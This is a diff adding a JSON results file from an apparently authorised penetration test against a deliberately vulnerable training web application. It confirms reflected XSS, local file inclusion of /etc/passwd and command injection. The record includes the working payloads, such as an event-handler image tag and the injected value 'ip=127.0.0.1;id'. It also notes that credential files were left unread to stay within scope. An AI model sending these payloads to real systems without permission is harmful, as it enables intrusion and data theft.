@@ -1,0 +1,67 @@
+{
+  "experiment": "E5/E6/E7",
+  "target": "https://pentest-ground.com:4280",
+  "timestamp_utc": "2026-10-25T12:05:39.374Z",
+  "probes": [
+    {
+      "name": "E5-reflected-xss",
+      "research_question": "Does the reflected-XSS module echo an event-handler payload into an executable HTML context without authentication, and is that distinguishable from ordinary reflection?",
+      "hypothesis": "Unauthenticated GET /vulnerabilities/xss_r/?name= reflects the value verbatim inside <pre>, so a script/event-handler payload executes in a victim browser.",
+      "positive": {
+        "url": "/vulnerabilities/xss_r/?name=<img src=x onerror=...>",
+        "verified_in_body": true,
+        "context": "<input type=\"text\" name=\"name\">\r\n\t\t\t\t<input type=\"submit\" value=\"Submit\">\r\n\t\t\t</p>\n\r\n\t\t</form>\r\n\t\t<pre>Hello <img src=x onerror=whaxon_c_5e21b></pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<ul>\r\n\t\t<li><a href=\"https://owasp.org/www-commun",
+        "body_sha256": "df6c6a4fbdbe42c2e5809696dd552e816408c7da41f06f9db0f5f829c5a17603"
+      },
+      "negative_control": {
+        "inert_marker_reflected_verbatim": true,
+        "non_reflecting_page_contains_payload": false
+      },
+      "verdict": "CONFIRMED",
+      "timestamp_utc": "2026-10-25T12:05:42.136Z",
+      "authentication": "none (unauthenticated session, 'Username: Unknown' in page footer)"
+    },
+    {
+      "name": "E7-local-file-inclusion",
+      "research_question": "Can an unauthenticated client make the application include an arbitrary absolute path?",
+      "hypothesis": "GET /vulnerabilities/fi/?page=<path> passes the value to PHP include(), so absolute and traversal paths disclose arbitrary readable files to an unauthenticated client.",
+      "positive": {
+        "url": "/vulnerabilities/fi/?page=/etc/passwd",
+        "passwd_lines_recovered": 18,
+        "first_line": "root:x:0:0:root:/root:/bin/bash",
+        "www_data_present": true,
+        "traversal_target_reached": false,
+        "body_sha256": "48513bcf262d05756672e93dd92e10fd378896e3008ffb01ffb9a4ea4a6c2d44"
+      },
+      "negative_control": {
+        "intended_include_still_renders": true,
+        "note": "the control shows the module works normally, so the positive is not a generic 200-with-junk"
+      },
+      "verdict": "CONFIRMED",
+      "timestamp_utc": "2026-10-25T12:05:44.303Z",
+      "sensitive_files_deliberately_not_read": [
+        "/var/www/html/config/config.inc.php (contains DB credentials)",
+        "any .env, key, token or user table content"
+      ],
+      "reason": "credential extraction is outside the authorised, non-destructive ceiling"
+    },
+    {
+      "name": "E6-command-injection",
+      "research_question": "Does the command-injection module concatenate user input into a shell command, and under which OS identity does that command run?",
+      "hypothesis": "POST /vulnerabilities/exec/ with ip=127.0.0.1;id executes `id` in the web server's shell context (not root).",
+      "positive": {
+        "url": "/vulnerabilities/exec/ (POST ip=127.0.0.1;id)",
+        "id_output": "uid=33(www-data) gid=33(www-data)",
+        "identity": "www-data",
+        "body_sha256": "2eb52434a9fac4144e5e512911cdf0b00ff21941c958abd5bcd2b58342583cc2"
+      },
+      "negative_control": {
+        "benign_ip_produced_uid_output": false,
+        "benign_ping_round_trips": true
+      },
+      "verdict": "CONFIRMED",
+      "timestamp_utc": "2026-10-25T12:05:51.761Z",
+      "privilege_note": "identity is the application's own service account; see docs/privilege-boundary-assessment.md"
+    }
+  ]
+}
